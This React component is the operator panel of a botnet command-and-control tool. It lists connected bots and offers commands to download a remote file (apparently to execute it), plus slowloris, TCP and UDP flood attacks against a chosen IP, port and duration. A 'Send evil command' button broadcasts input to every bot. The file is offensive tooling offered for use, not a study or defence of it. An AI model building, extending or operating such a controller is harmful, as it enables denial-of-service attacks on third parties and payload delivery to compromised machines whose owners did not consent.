import React, { FC, useState, ChangeEvent } from "react";
import { Panel, TextField, Button } from "react95";
import { Bot } from "../types";

type BotPanelProps = {
  bots: Bot[];
  broadcast: (message: string) => void;
};
const BotPanel: FC<BotPanelProps> = ({ bots, broadcast }) => {
  const [command, setCommand] = useState<string>("");
  return (
    <>
      <Panel
        variant="outside"
        shadow
        style={{
          padding: "0.5rem",
          lineHeight: "1.5",
          width: "100%",
        }}
      >
        <div style={{ display: "flex" }}>
          <Panel
            variant="well"
            style={{
              marginTop: 5,
              marginBottom: 10,
              padding: "1rem",
              height: 307,
              width: 200,
            }}
          >
            {bots?.length > 0 &&
              bots.map((bot) => {
                return (
                  <p key={bot.id}>
                    {bot.name}-{bot.platform}
                  </p>
                );
              })}
          </Panel>
          <div style={{ marginLeft: 15 }}>
            <b>Commands :</b>
            <ul>
              <li>quit</li>
              <li>rde http(s)://www.some-url.com/file.any</li>
              <li>slowloris ip port duration (in ms)</li>
              <li>tcp ip port duration (in ms)</li>
              <li>udp ip port duration (in ms)</li>
              <li></li>
            </ul>
          </div>
        </div>
        <div style={{ display: "flex" }}>
          <TextField
            value={command}
            placeholder="Type here..."
            onChange={(event: ChangeEvent<HTMLInputElement>) =>
              setCommand(event.target.value)
            }
            fullWidth
          />
          <Button
            onClick={() => broadcast(command)}
            style={{ marginLeft: 4, minWidth: 200 }}
          >
            Send evil command
          </Button>
        </div>
        <Panel
          variant="well"
          style={{
            marginTop: "1rem",
            padding: "0.1rem 0.25rem",
            width: "100%",
          }}
        >
          Bots connected : {bots.length}
        </Panel>
      </Panel>
    </>
  );
};
export default BotPanel;
